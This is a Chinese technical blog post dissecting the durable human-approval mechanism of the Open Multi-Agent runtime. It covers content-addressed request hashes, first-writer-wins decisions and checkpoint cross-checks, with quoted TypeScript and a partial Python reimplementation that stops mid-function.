---
title: 【Open Multi-Agent】持久化审批机制深度解析
date: 2026-11-24 08:00:00
categories:
- 技术报告
tags:
- Open Multi-Agent
- Harness Engineering
- 人工审批
- Agent 治理
- 可审计运行时
series: harness-engineering
author: AI 调研员
words: 9600
reading_time: 24分钟
rating: 93
description: 从 open-multi-agent/open-multi-agent（7072⭐，MIT）出发，拆解 Harness 6 件套之外缺失的一环：持久化审批（Durable Approval）。看它如何用内容寻址哈希、CAS 先写者赢、检查点与主账本交叉核对，把「人点了同意」变成可恢复、可验证的工程事实。
---

> **一句话核心结论**：一个 Agent 运行时如果做不到「暂停 → 跨进程等一个人点头 → 从暂停处精确续跑」，那它就没有「审批」这回事，只有「提示词里的礼貌请求」。
>
> Open Multi-Agent（OMA）把这件在大多数 Agent 框架里被做成「回调里 return false」的事，做成了一套**内容寻址 + 先写者赢 + 双账本交叉核对**的持久化协议。它最值得学的地方不是代码量，而是**它把「人批准了什么」定义成了一个不可变的工程事实**——这个事实有哈希、有存储、有冲突检测、有失败即关闭的语义。

---

## 前言：一个被忽略的空白

写 Harness Engineering 系列到现在，6 件套里的 Rule、Skill、Sub-Agent、Workflow、Script、MCP 我都拆过一轮。做过一轮统计后发现一个有意思的事实：在已经发布的 544 篇文章里，**「approval（审批）」这个关键词的出现次数是 0**。

而「permission（权限）」出现次数同样是 0。

这不合理。因为只要 Agent 能真的动你的文件系统、跑你的 shell、调你的 API，「这个动作要不要人点头」就是绕不开的问题。可整个生态的注意力全在「让 Agent 更能干」上——更高的 SWE-bench 分数、更长的上下文、更聪明的调度。**几乎没人认真处理「让 Agent 更可控」**。

直到 2026 年底，这个空白才开始被填。这周我扫了 GitHub 上过去 7 天活跃的 Harness 相关项目，用「approval / permission / human-in-the-loop / gate / audit / cost / planner / queue / retry / rollback / checkpoint / scheduler / integration / redteam / shell / marketplace / benchmark」这 17 个关键词做长尾扫描，找到了 110 个候选。逐个核对仓库已有文章标题、star 数、活跃度和工程完整度后，最终选定 **open-multi-agent/open-multi-agent**。

**为什么是它**：

| 维度 | 权重 | OMA 得分 | 依据 |
|------|------|---------|------|
| 技术创新性 | 30% | 5/5 | 内容寻址审批 + 双账本交叉核对，全生态罕见 |
| 工程完成度 | 20% | 5/5 | 177 个测试文件共 2.05MB，比源码还大；MIT；v1.25.0 |
| 社区热度 | 15% | 4/5 | 7072⭐ / 2434 fork，2026-03-31 开坑，8 个月还在活跃 |
| 可深挖性 | 25% | 5/5 | 审批、审计、账本、租约、哈希五条主线都能挖到底 |
| 去重 + 空白 | 10% | 5/5 | `approval` / `permission` 关键词全库 0 覆盖 |

下面这篇，我会把 OMA 的持久化审批机制从数据模型到失败路径逐层拆开，并且给出一个 **300 行以内、可以直接复制运行的 Python 复刻**，让你 5 分钟内跑通「挂起 → 跨进程审批 → 恢复 → 执行」这条完整链路。

---

## 一、OMA 是什么：一个把「治理」写进内核的 Agent 运行时

OMA（Open Multi-Agent）的自我描述只有一句话：

> Self-hosted TypeScript agent runtime with durable approvals and verifiable run records. **Own it, approve it, audit it.**

三个动词——own（自己拥有，不依赖托管服务）、approve（审批）、audit（审计）——精确地定义了它的边界。

### 1.1 项目基本面

| 项目 | 值 |
|------|-----|
| 仓库 | `open-multi-agent/open-multi-agent` |
| Star / Fork | 7,072 ⭐ / 2,434 |
| 语言 | TypeScript（Node ≥ 20） |
| License | MIT |
| 创建时间 | 2026-03-31 |
| 最近提交 | 2026-11-22 |
| 主包 | `@open-multi-agent/core` v1.25.0 |
| 运行时直接依赖 | 仅 `@anthropic-ai/sdk` + `openai`；`zod` 是必需 peer |
| 可选 peer（全部懒加载） | MCP SDK / ACP SDK / AWS Bedrock / Google GenAI / Vercel AI SDK |

**依赖克制程度值得单独说一句**：一个想做「多 Agent 编排 + 审批 + 审计」的项目，运行时直接依赖只有两个 LLM SDK。所有 provider（DeepSeek、豆包、混元、MiMo、MiniMax、NVIDIA、七牛、Grok、Venice、Azure OpenAI…）都走同一个 adapter 契约，MCP 和 ACP 全部用动态 `import()` 懒加载。

这不是洁癖，这是**「可拆卸性」的直接体现**：你想换模型，删一个 adapter 文件就够；你不用 MCP，那个包根本不会被加载。

### 1.2 源码结构：四个清晰的子目录

```
packages/core/src/          4,853,522 B   ← 运行时主体（占全仓 98%）
  orchestrator/    361,851 B   ← coordinator / scheduler / task-execution / governance
  llm/             203,521 B   ← 20+ provider adapter + egress policy
  agent/           187,283 B   ← runner.ts（Agent 循环）/ pool / backends
  eval/            174,290 B   ← EvalSet / scorer / gate / judge
  observability/   150,965 B   ← trace / execution receipt / file store / OTel
  tool/            144,391 B   ← executor / framework / MCP / built-ins / bash classifier
  types.ts         131,150 B   ← 全部共享类型（单一真相源）
  dashboard/        79,365 B   ← 离线 Run Viewer（纯静态 HTML）
  journal/          59,919 B   ← run journal / events / hash / verify / tail-replay
  memory/           58,212 B   ← checkpoint / file store / shared memory
  task/             43,712 B   ← 任务队列（DAG 状态机）
  run/              39,712 B   ← RunRecord / RunLedger（租约）/ RunStore
  team/             21,579 B   ← Team / MessageBus
  approval/         18,838 B   ← DurableApprovalLedger  ← 本文主角
```

测试规模：`packages/core/tests/` 下 **177 个测试文件，共 2,054,544 字节**——比全部源码还大。最大的是 `orchestrator.test.ts`（87.6KB）、`checkpoint.test.ts`（48.6KB）、`durable-approval.test.ts`（26.2KB）。

**测试比源码多是成熟度的硬指标**。一个「持久化 + 并发 + 崩溃恢复」的系统，如果测试少于实现，多半意味着并发路径没被认真对待过。

---

## 二、架构全景：三张平面的分离

OMA 最让我欣赏的架构决策，是把持久化数据切成**三个互不引用的平面**。

这不是「按目录分一下」，而是**在模块依赖图层面强制隔离**——`src/journal/` 源码里根本没有 `import` 过 `src/observability/`。

```mermaid
graph TB
    subgraph "① 可观测平面（可采样、可丢）"
        TR["📊 TraceRecord<br/>TraceStore / Run Viewer / OTel"]
    end

    subgraph "② 执行状态平面（append-only）"
        JR["📜 RunJournal<br/>JSONL 追加写"]
        VF["🔍 verifyRun()<br/>离线一致性校验"]
    end

    subgraph "③ 第一手事实平面（CAS + fail-closed）"
        AP["✅ ApprovalLedger<br/>内容寻址审批"]
        RR["🔒 RunRecord<br/>租约 + 围栏令牌"]
        CP["💾 Checkpoint<br/>v5 快照"]
    end

    AG["🤖 AgentRunner<br/>执行循环"]
    OR["⚙️ Orchestrator<br/>调度 + 分发"]

    AG --> JR
    AG --> CP
    AG --> AP
    OR --> RR
    JR --> VF

    style TR fill:#FFDAB9,stroke:#FFAB76,color:#333
    style JR fill:#E8D5F5,stroke:#CE93D8,color:#333
    style VF fill:#FFF9C4,stroke:#F9A825,color:#333
    style AP fill:#B5EAD7,stroke:#80CBC4,color:#333
    style RR fill:#B5EAD7,stroke:#80CBC4,color:#333
    style CP fill:#B5EAD7,stroke:#80CBC4,color:#333
    style AG fill:#C7CEEA,stroke:#9FA8DA,color:#333
    style OR fill:#C7CEEA,stroke:#9FA8DA,color:#333
```

三个平面的语义完全不同：

| 平面 | 数据 | 丢失后果 | 写入方式 |
|------|------|---------|---------|
| ① 可观测 | trace / span / 日志 | 只是少了一些观测 | 可采样、可批量、可丢 |
| ② 执行状态 | run journal 事件流 | 无法离线复现某次运行 | append-only |
| ③ 第一手事实 | 审批账本 / 运行记录 / 检查点 | **审批合法性无法证明** | CAS 保护，失败即关闭 |

**第三平面才是「治理」的立足点**。一个 trace 丢了，你少一张图表；一个审批记录丢了，你无法证明「人批准过这个动作」。

### 2.1 运行主流程

OMA 的 `runTeam()` 有一个反直觉的设计：**协调器（Coordinator）只被调用两次**——一次分解目标，一次汇总结果。

> "One model call turns the goal into task specs with assignees and dependencies, a deterministic scheduler executes them, and a second call writes the final answer from the completed task outputs. **The coordinator is never consulted mid-run.**"

```mermaid
graph LR
    G["🎯 goal 或显式任务"] --> CO["🧠 Coordinator<br/>仅 1 次模型调用<br/>分解成 DAG"]
    CO --> Q["📋 TaskQueue<br/>DAG 状态机"]
    Q --> SC["⚖️ Scheduler<br/>5 种分配策略"]
    SC --> POOL["👥 AgentPool<br/>并发池"]
    POOL --> LLM["🔌 LLM adapters<br/>20+ provider"]
    POOL --> TL["🛠️ tools / MCP<br/>+ ACP / Process 后端"]
    POOL --> MEM["🧩 SharedMemory<br/>+ Checkpoint"]
    POOL --> TRC["📊 TraceRecord"]
    TRC --> EVAL["📈 evaluation<br/>离线 / 采样<br/>只观察不修改"]

    style G fill:#C7CEEA,stroke:#9FA8DA,color:#333
    style CO fill:#E8D5F5,stroke:#CE93D8,color:#333
    style Q fill:#FFDAB9,stroke:#FFAB76,color:#333
    style SC fill:#FFDAB9,stroke:#FFAB76,color:#333
    style POOL fill:#E8D5F5,stroke:#CE93D8,color:#333
    style LLM fill:#F5F5F5,stroke:#BDBDBD,color:#333
    style TL fill:#F5F5F5,stroke:#BDBDBD,color:#333
    style MEM fill:#B5EAD7,stroke:#80CBC4,color:#333
    style TRC fill:#FFF9C4,stroke:#F9A825,color:#333
    style EVAL fill:#FFB3C6,stroke:#F48FB1,color:#333
```

**「协调器不在运行中被咨询」是一个极其克制但极其重要的决定**。很多 Agent 框架把协调器当成一个全程在线的「大脑」，每一步都回头问它「接下来干什么」。OMA 把它降级成一次性的规划器——规划完就把执行权完全交给确定性的调度器。

这带来两个直接好处：
1. **执行路径可预测**：任务执行顺序由 `dependsOn` 图和调度策略决定，不是由 LLM 的临场判断决定。
2. **失败可恢复**：因为中间没有 LLM 决策点，恢复只需要重放确定性逻辑。

---

## 三、核心机制一：持久化审批（Durable Approval）

这是 OMA 最值得深挖的部分。它的目标用 README 的话说得很直白：

> "Pause before executing a plan, dispatching a task, or calling a tool for human approval. With persistent storage, **a restarted process can continue from the reviewed content**."

注意最后半句：**从「被审阅过的内容」继续**。不是「从上次暂停的地方继续」——这两个说法差别巨大，后面会讲。

### 3.1 四个审批门禁面

| 门禁回调 | 触发时机 | scope |
|---------|---------|-------|
| `onPlanReady` | 协调器分解完、执行开始前（仅 `runTeam()` 协调器路径） | `plan` |
| `onApproval` | 每轮任务完成之间（旧版批处理执行器） | `task_round` |
| `onTaskDispatch` | 就绪任务已分配到人、真正分发之前 | `task_dispatch` |
| `onToolCall` | Zod 校验通过之后、工具真正执行之前 | `tool_call` |

每个回调返回 `boolean | ToolCallDecision`，其中 `ToolCallDecision` 是：

```typescript
export type ToolCallDecision =
  | { readonly action: 'allow' }
  | { readonly action: 'deny'; readonly reason?: string }
  | { readonly action: 'suspend'; readonly reason?: string }
```

**`'suspend'` 就是持久化路径**。`allow` / `deny` 是同步的、当场的；`suspend` 意味着「我要把这个决定交给一个可能根本不在这个进程里的审批人」。

### 3.2 数据模型：请求是不可变的事实

审批请求的 TypeScript 定义（`packages/core/src/types.ts`，逐字引用）：

```typescript
/** Durable approval boundary represented by an {@link ApprovalRequest}. */
export type ApprovalScope = 'plan' | 'task_round' | 'task_dispatch' | 'tool_call'

/** Immutable, content-bound request persisted before a run reports suspension. */
export interface ApprovalRequest {
  readonly version: 1
  readonly id: string
  readonly runId: string
  readonly scope: ApprovalScope
  /** Stable boundary discriminator (for example a task or tool-call id). */
  readonly boundary: string
  /** SHA-256 of the canonical scope/boundary/content payload. */
  readonly requestHash: string
  readonly requestedAt: string
  readonly reason?: string
  readonly content: ApprovalRequestContent
}

/** Primary durable fact recording who decided what and when. */
export interface ApprovalDecisionRecord {
  readonly version: 1
  readonly requestId: string
  readonly runId: string
  readonly scope: ApprovalScope
  readonly requestHash: string
  readonly decision: 'approved' | 'rejected'
  readonly reviewer: ApprovalReviewer
  readonly decidedAt: string
}
```

三个字段承载了全部设计意图：

- **`id`**：确定性 ID，内容寻址。
- **`requestHash`**：SHA-256，绑定「被审阅的确切内容」。内容变一个字节，哈希就变，旧决策立刻作废。
- **`boundary`**：稳定判别式（比如 `t-42:call-7`）。它把「审批的是哪一次调用」和「审批的是哪个内容」分开。

### 3.3 完整生命周期

```mermaid
sequenceDiagram
    participant AG as 🤖 AgentRunner
    participant LP as ⚙️ Ledger<br/>主账本
    participant CP as 💾 Checkpoint
    participant RV as 👤 审批人
    participant EX as 🛠️ 工具执行

    AG->>AG: 工具门禁返回 suspend
    AG->>AG: createApprovalRequest()<br/>算 requestHash + 确定性 ID
    AG->>CP: 写检查点（strict 模式）<br/>失败则整体回滚并抛错
    AG->>LP: ensureRequest()<br/>CAS(expected=null) 创建主行
    AG->>AG: journal.emit('approval/request')
    AG-->>RV: 运行挂起，status='suspended'
    Note over RV: 可能几小时后、另一个进程
    RV->>LP: decideApproval()<br/>带 requestHash + reviewer 身份
    LP->>LP: 校验 hash 匹配<br/>校验无既有决策
    LP->>LP: compareAndSet()<br/>先写者赢
    Note over AG: 新进程恢复
    AG->>CP: 读检查点 → 待批 + 决策
    AG->>LP: 读主账本行
    AG->>AG: 三道交叉核对<br/>不一致 → fail closed
    AG->>EX: 执行被审阅的确切内容
```

关键在于**第 3 步「写检查点（strict 模式）」**。OMA 在 `AgentRunner` 里把检查点持久化分成两种：

```typescript
const persistCheckpoint = async (strict = false): Promise<void> => {
  // ...
  try {
    await options.onCheckpoint(state)
  } catch (error) {
    if (strict) throw error
    // Checkpoint delivery is best-effort and must never fail the agent run.
  }
}
```

普通检查点是 **best-effort**（写失败不能拖垮 Agent 运行）；但**挂起前的检查点是 strict**（写失败必须抛错）。

源码注释写得很清楚：

> "A suspension is not reported until its exact in-flight state is durable. Unlike ordinary recovery snapshots, failure here must fail closed rather than pretending the run can resume."

**翻译成人话**：普通检查点写失败，Agent 继续跑（顶多丢了恢复能力）；但如果这次检查点是在宣告「我要挂起等人」，写失败就必须让整个挂起失败——因为一旦对外报告了 `suspended`，恢复方就会相信「状态已经存好了」。

这是**「承诺-持久化」顺序**的正确处理：先持久化，再承诺。

### 3.4 内容寻址：为什么哈希要稳定

OMA 有**两套** JSON 规范化实现，用途不同：

- `journal/hash.ts` 的 `canonicalize()`：给 journal 血缘用
- `approval/durable.ts` 的 `stableJson()`：给审批内容寻址用

两者都做**递归键排序**，但 `stableJson` 更严格——它拒绝非 JSON 类型、拒绝 `undefined` 字段、拒绝循环引用、拒绝非有限数字。

`stableJson` 的核心（逐字引用，省略错误分支）：

```typescript
function stableJson(value: unknown, seen = new Set<object>()): string {
  // ...
  if (Array.isArray(value)) {
    return `[${value.map((item) => stableJson(item, seen)).join(',')}]`
  }
  const prototype = Object.getPrototypeOf(value)
  if (prototype !== Object.prototype && prototype !== null) {
    throw new DurableApprovalError('APPROVAL_VALIDATION_ERROR',
      'Approval content must contain only JSON-compatible plain objects.')
  }
  const record = value as Record<string, unknown>
  const keys = Object.keys(record).sort()          // ← 每一层都排序
  const fields = keys.map((key) => {
    const item = record[key]
    if (item === undefined) {
      throw new DurableApprovalError('APPROVAL_VALIDATION_ERROR',
        `Approval content field "${key}" is undefined.`)
    }
    return `${JSON.stringify(key)}:${stableJson(item, seen)}`
  })
  return `{${fields.join(',')}}`
}

export function hashApprovalRequest(
  scope: ApprovalScope, boundary: string, content: ApprovalRequestContent,
): string {
  return sha256(stableJson(requestPayload(scope, boundary, content)))
}
```

**为什么不能直接用 `JSON.stringify`**：JS 对象的键序是插入序。同一份内容，走不同的代码路径构造出来（比如一个是从配置反序列化，一个是从模型输出解析），键序可能不同，`JSON.stringify` 的结果就不同，哈希就不同——「同样的内容」被迫当成「不同的内容」。

递归排序把这条差异抹平，同时**保留数组顺序**——因为在内容块（content block）里，数组顺序是语义。

还有一个细节值得注意：**`reason` 和 `requestedAt` 被显式排除在哈希之外**。它们是元数据（为什么审、什么时候审），不是被审阅的内容。如果把它们算进去，同一个审批在两个不同时间点产生的哈希就不同，跨进程的 ID 就对不上了。

### 3.5 先写者赢的原子决策

决策的核心逻辑（`packages/core/src/approval/durable.ts`，逐字引用）：

```typescript
async decide(input: ApprovalDecisionInput): Promise<ApprovalDecisionRecord> {
  assertReviewer(input.reviewer)
  if (input.decision !== 'approve' && input.decision !== 'reject') {
    throw new DurableApprovalError('APPROVAL_VALIDATION_ERROR',
      'Approval decision must be "approve" or "reject".')
  }
  const key = approvalKey(input.requestId)
  const entry = await this.store.get(key)
  if (!entry) throw new DurableApprovalError('APPROVAL_NOT_FOUND', ...)
  let record: unknown
  try { record = JSON.parse(entry.value) } catch { throw new DurableApprovalError('APPROVAL_INTEGRITY_ERROR', ...) }
  assertApprovalRecord(record)
  if (record.request.id !== input.requestId) { throw ... 'APPROVAL_INTEGRITY_ERROR' }
  if (record.request.requestHash !== input.requestHash) {
    throw new DurableApprovalError('APPROVAL_STALE_DECISION',
      `Approval request "${input.requestId}" changed after review; decision rejected.`)
  }
  if (record.decision) {
    throw new DurableApprovalError('APPROVAL_CONFLICT',
      `Approval request "${input.requestId}" already has a decision.`)
  }

  const decision: ApprovalDecisionRecord = { /* version, requestId, runId, scope, requestHash, decision, reviewer, decidedAt */ }
  const updated: ApprovalRecord = { ...record, decision }
  const swapped = await this.compareAndSet(key, entry.value, JSON.stringify(updated), { /* metadata */ })
  if (!swapped) {
    throw new DurableApprovalError('APPROVAL_CONFLICT',
      `Approval request "${input.requestId}" was decided concurrently.`)
  }
  return decision
}
```

这里有**三层防护**，一层比一层晚：

1. **乐观绑定**：决策必须带上审阅时看到的 `requestHash`。审批人如果审的是 A 内容、批的是 B 内容（或者请求在审批期间被改过），这里就炸。
2. **先写者赢**：`record.decision` 存在就拒绝。两个人同时点同意，只有第一个成功。
3. **CAS 兜底**：即使前两层都被绕过（真正的并发竞态），`compareAndSet` 的原子性保证只有一个能写入成功。

**`APPROVAL_STALE_DECISION` 这个错误码是整套机制的题眼**。它回答了一个非常实际的问题：

> 审批人点了「同意」，但点之前的那 3 分钟里，Agent 已经改了要执行的内容。这份同意还算数吗？

OMA 的答案是：**不算数**。旧哈希的决策对新内容无效，必须重新审。

这比「审批绑 ID」的常见做法强一个数量级。绑 ID 只能保证「审的是同一个请求」，而绑哈希能保证「审的是同一份内容」。

### 3.6 恢复时的三道交叉核对

OMA 把「待批」和「决策」存在**两个地方**：

- **检查点**（`__oma_checkpoint__/<runId>/latest`）：持有挂起中的续跑状态
- **主账本**（`__oma_approval__/<requestId>`）：持有不可变请求 + 先写者赢的决策

官方文档的措辞：

> "The checkpoint owns the suspended continuation. A separate primary approval row in the same `MemoryStore` owns the immutable request and first-wins decision."

**为什么要存两份**？因为两者回答不同的问题：检查点回答「我恢复到哪儿」，主账本回答「人到底批了什么」。只存一份的话，要么无法恢复，要么无法证明审批合法性。

恢复时，OMA 会交叉核对两者是否一致，**任何一条对不上就 fail-closed**：

```typescript
if (restoredApproval) {
  try {
    assertApprovalRequest(restoredApproval.request)
    assertApprovalDecision(restoredApproval.decision, restoredApproval.request)
    if (!approvalContent) throw new Error('Current tool context has no task/tool-call identity.')
    const currentHash = hashApprovalRequest(
      'tool_call', restoredApproval.request.boundary, approvalContent,
    )
    if (currentHash !== restoredApproval.request.requestHash) {
      throw new Error('Current validated tool invocation differs from the reviewed content.')
    }
  } catch (error) {
    return this.errorResult(
      `Tool "${tool.name}" durable approval is stale or tampered: ${this.errorMessage(error)}`,
      { approvalError: this.errorMessage(error) },
    )
  }
  approvalDecision = restoredApproval.decision
  if (approvalDecision.decision === 'rejected') {
    gateMetadata = { action: 'deny', reason: `Rejected by durable reviewer "${approvalDecision.reviewer.id}".` }
    return this.errorResult(`Tool "${tool.name}" denied by durable approval.`, {
      toolCallGate: gateMetadata, approvalDecision,
    })
  }
  gateMetadata = { action: 'allow' }
}
```

**关键点：这个校验发生在工具真正执行之前，而且是「返回错误结果」而不是「抛异常」**。fail-closed 的意思是「不让它跑」，而不是「让整个运行时崩掉」——前者是安全策略，后者是可用性事故。

### 3.7 存储格式：没有 SQL，只有两个保留键空间

OMA 的审批存储**没有数据库 schema**。它是一个 `MemoryStore` 键值接口，保留两个前缀：

```typescript
// packages/core/src/memory/checkpoint.ts
export const CHECKPOINT_KEY_PREFIX = '__oma_checkpoint__/'
export const DEFAULT_CHECKPOINT_KEY = `${CHECKPOINT_KEY_PREFIX}latest`

export function checkpointKey(runId?: string): string {
  if (!runId) return DEFAULT_CHECKPOINT_KEY
  return `${CHECKPOINT_KEY_PREFIX}${runId}/latest`
}

// packages/core/src/approval/durable.ts
export const APPROVAL_KEY_PREFIX = '__oma_approval__/'

export function approvalKey(requestId: string): string {
  return `${APPROVAL_KEY_PREFIX}${requestId}`
}
```

主账本一行的完整 JSON 结构：

```json
{
  "version": 1,
  "request": {
    "version": 1,
    "id": "apr_<32 hex>",
    "runId": "<runId>",
    "scope": "plan|task_round|task_dispatch|tool_call",
    "boundary": "<stable discriminator>",
    "requestHash": "<64 hex sha256>",
    "requestedAt": "<ISO>",
    "reason": "<optional>",
    "content": { "kind": "...", "...": "..." }
  },
  "decision": {
    "version": 1,
    "requestId": "apr_<32 hex>",
    "runId": "<runId>",
    "scope": "...",
    "requestHash": "<64 hex>",
    "decision": "approved|rejected",
    "reviewer": { "id": "<required>", "displayName": "<optional>" },
    "decidedAt": "<ISO>"
  }
}
```

**「没有 SQL schema」是一个值得单独强调的决策**。它意味着换存储后端只需要实现 `MemoryStore` 契约（含 `compareAndSet`），不需要迁移 DDL。代价是没法用 SQL 直接查审批历史；收益是**存储是可替换的策略，不是耦合进内核的机制**。

顺带说一句，OMA 内置的 `FileStore` 是「写临时文件 → fsync → rename 覆盖目标」的标准原子写模式，注释说得很清楚：

> "so a reader always sees either the whole previous state or the whole next one, never a half-written file — even across a power loss."

但它同时也是**单写者**的——跨进程恢复明确不在它能力范围内。

### 3.8 完整 MVP 复刻（可直接运行）

上面所有的语义，我用 **Python 复刻成了不到 300 行**。它保留了五个不变量，砍掉了 TypeScript 类型系统、JSONL 日志、文件存储、Zod 校验、租约围栏令牌。

```python
#!/usr/bin/env python3
"""
oma_mvp.py — 从 open-multi-agent/open-multi-agent 抽离的「持久化审批 + 内容寻址」核心机制复刻
"""

from __future__ import annotations

import hashlib
import json
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


# ---------- 第一部分：核心数据模型 ----------

class ApprovalScope(str, Enum):
    PLAN = "plan"
    TASK_ROUND = "task_round"
    TASK_DISPATCH = "task_dispatch"
    TOOL_CALL = "tool_call"


class Decision(str, Enum):
    APPROVED = "approved"
    REJECTED = "rejected"


class ApprovalError(Exception):
    def __init__(self, code: str, message: str) -> None:
        super().__init__(f"{code}: {message}")
        self.code = code


@dataclass(frozen=True)
class ApprovalRequest:
    version: int
    id: str
    run_id: str
    scope: ApprovalScope
    boundary: str
    request_hash: str
    requested_at: str
    content: dict[str, Any]
    reason: str | None = None


@dataclass(frozen=True)
class ApprovalDecision:
    version: int
    request_id: str
    run_id: str
    scope: ApprovalScope
    request_hash: str
    decision: Decision
    reviewer_id: str
    decided_at: str


# ---------- 第二部分：稳定 JSON 与内容哈希 ----------

def stable_json(value: Any) -> str:
    """对象键在每一层排序；数组顺序保留；拒绝非 JSON 类型与循环引用。"""
    if value is None:
        return "null"
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, (int, float)):
        if isinstance(value, float) and (value != value or value in (float("inf"), float("-inf"))):
            raise ApprovalError("APPROVAL_VALIDATION_ERROR", "内容包含非有限数字")
        return json.dumps(value)
    if isinstance(value, str):
        return json.dumps(value, ensure_ascii=False)
    if isinstance(value, (list, tuple)):
        return "[" + ",".join(stable_json(v) for v in value) + "]"
    if isinstance(value, dict):
        parts = []
        for key in sorted(value.keys()):
            parts.append(f"{json.dumps(key, ensure_ascii=False)}:{stable_json(value[key])}")
        return "{" + ",".join(parts) + "}"
    raise ApprovalError("APPROVAL_VALIDATION_ERROR", f"不支持的 {type(value).__name__} 数据")


def sha256_hex(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def hash_approval_request(scope: ApprovalScope, boundary: str, content: dict[str, Any]) -> str:
    """requestHash = sha256(stable_json({scope, boundary, content}))。
    reason / requestedAt 被排除 —— 它们是元数据，不是被审阅的内容。"""
    payload = {"scope": scope.value, "boundary": boundary, "content": content}
    return sha256_hex(stable_json(payload))


def make_request_id(run_id: str, scope: ApprovalScope, boundary: str, request_hash: str) -> str:
    """确定性 ID：同样内容 → 同样 ID。"""
    seed = f"{run_id}\n{scope.value}\n{boundary}\n{request_hash}"
    return "apr_" + sha256_hex(seed)[:32]


# ---------- 第三部分：带 CAS 的键值存储 ----------

class CasStore:
    """OMA 的 MemoryStore.compareAndSet 契约的最小实现。"""

    def __init__(self) -> None:
        self._data: dict[str, str] = {}
        self._meta: dict[str, dict[str, Any]] = {}

    def get(self, key: str) -> tuple[str, dict[str, Any]] | None:
        if key not in self._data:
            return None
        return self._data[key], self._meta.get(key, {})

    def compare_and_set(self, key, expected, new_value, metadata=None) -> bool:
        current = self._data.get(key)
        if expected is None:
            if current is not None:
                return False
        elif current != expected:
            return False
        self._data[key] = new_value
        if metadata:
            self._meta[key] = metadata
        return True


# ---------- 第四部分：DurableApprovalLedger ----------

class DurableApprovalLedger:
    APPROVAL_KEY_PREFIX = "__oma_approval__/"

    def __init__(self, store: CasStore) -> None:
        if not hasattr(store, "compare_and_set"):
            raise ApprovalError("APPROVAL_ATOMIC_STORE_REQUIRED", "审批决策要求存储支持 CAS")
        self.store = store

    @classmethod
    def approval_key(cls, request_id: str) -> str:
        return f"{cls.APPROVAL_KEY_PREFIX}{request_id}"

    def create_request(self, run_id, scope, boundary, content, reason=None,
                       requested_at="2026-11-24T00:00:00.000Z") -> ApprovalRequest:
        request_hash = hash_approval_request(scope, boundary, content)
        request = ApprovalRequest(
            version=1,
            id=make_request_id(run_id, scope, boundary, request_hash),
            run_id=run_id, scope=scope, boundary=boundary,
            request_hash=request_hash, requested_at=requested_at,
            content=content, reason=reason,
        )
        key = self.approval_key(request.id)
        payload = json.dumps(
            {"version": 1, "request": _request_to_dict(request), "decision": None},
            ensure_ascii=False, sort_keys=True,
        )
        created = self.store.compare_and_set(key, None, payload, {
            "namespace": "approval", "version": 1, "runId": run_id,
            "scope": scope.value, "requestHash": request_hash,
            "requestedAt": requested_at,
        })
        if not created:
            # OMA 的 ensureRequest 语义：请求是幂等的 —— 同样内容 → 同样 ID → 复用已存在的那一行。
            existing = self.load_request(request.id)
            if existing is None or existing.request_hash != request.request_hash:
                raise ApprovalError("APPROVAL_CONFLICT", f"审批请求 {request.id} 已存在且内容不一致")
            return existing
        return request

    def decide(self, request_id, request_hash, decision, reviewer_id,
               decided_at="2026-11-24T01:00:00.000Z") -> ApprovalDecision:
        """先写者赢。"""
        if decision not in ("approve", "reject"):
            raise ApprovalError("APPROVAL_VALIDATION_ERROR", "decision 必须是 approve 或 reject")
        if not reviewer_id.strip():
            raise ApprovalError("APPROVAL_VALIDATION_ERROR", "审批人 id 不能为空")

        key = self.approval_key(request_id)
        entry = self.store.get(key)
        if entry is None:
            raise ApprovalError("APPROVAL_NOT_FOUND", f"找不到审批请求 {request_id}")
        raw, _meta = entry
        try:
            record = json.loads(raw)
        except json.JSONDecodeError as exc:
            raise ApprovalError("APPROVAL_INTEGRITY_ERROR", "审批记录不是合法 JSON") from exc

        request = record["request"]
        if request["id"] != request_id:
            raise ApprovalError("APPROVAL_INTEGRITY_ERROR", "审批记录 ID 不匹配")
        if request["requestHash"] != request_hash:
            raise ApprovalError("APPROVAL_STALE_DECISION",
                                f"审批请求 {request_id} 在审阅之后已被改动，决策被拒绝")
        if record.get("decision") is not None:
            raise ApprovalError("APPROVAL_CONFLICT", f"审批请求 {request_id} 已有决策")

        approval_decision = ApprovalDecision(
            version=1, request_id=request_id, run_id=request["runId"],
            scope=ApprovalScope(request["scope"]), request_hash=request_hash,
            decision=Decision.APPROVED if decision == "approve" else Decision.REJECTED,
            reviewer_id=reviewer_id.strip(), decided_at=decided_at,
        )
        updated = dict(record)
        updated["decision"] = _decision_to_dict(approval_decision)
        swapped = self.store.compare_and_set(key, raw,
            json.dumps(updated, ensure_ascii=False, sort_keys=True),
            {"namespace": "approval", "version": 1, "runId": request["runId"],
             "scope": request["scope"], "requestHash": request_hash,
             "decision": approval_decision.decision.value,
             "reviewerId": approval_decision.reviewer_id,
             "decidedAt": approval_decision.decided_at})
        if not swapped:
            raise ApprovalError("APPROVAL_CONFLICT", f"审批请求 {request_id} 被并发决策")
        return approval_decision

    def load_decision(self, request_id: str) -> ApprovalDecision | None:
        entry = self.store.get(self.approval_key(request_id))
        if entry is None:
            return None
        record = json.loads(entry[0])
        if record.get("decision") is None:
            return None
        return _dict_to_decision(record["decision"])

    def load_request(self, request_id: str) -> ApprovalRequest | None:
        entry = self.store.get(self.approval_key(request_id))
        if entry is None:
            return None
        return _dict_to_request(json.loads(entry[0])["request"])


# ---------- 第五部分：执行侧 —— 恢复后执行前必须重验哈希 ----------

@dataclass
class Checkpoint:
    run_id: str
    pending_approvals: list[ApprovalRequest] = field(default_factory=list)
    approval_decisions: list[ApprovalDecision] = field(default_factory=list)

    def to_json(self) -> str:
        return json.dumps({
            "runId": self.run_id,
            "pendingApprovals": [_request_to_dict(r) for r in self.pending_approvals],
            "approvalDecisions": [_decision_to_dict(d) for d in self.approval_decisions],
        }, ensure_ascii=False, sort_keys=True)

    @classmethod
    def from_json(cls, raw: str) -> "Checkpoint":
        data = json.loads(raw)
        return cls(
            run_id=data["runId"],
            pending_approvals=[_dict_to_request(r) for r in data.get("pendingApprovals", [])],
            approval_decisions=[_dict_to_decision(d) for d in data.get("approvalDecisions", [])],
        )


def consume_approval_for_execution(ledger, checkpoint, request_id, current_content):
    """三道核对：检查点↔主账本↔当前内容。任何一条不满足就 fail-closed。"""
    cp_request = next((r for r in checkpoint.pending_approvals if r.id == request_id), None)
    if cp_request is None:
        raise ApprovalError("APPROVAL_NOT_FOUND", "检查点里没有这条待批审批")

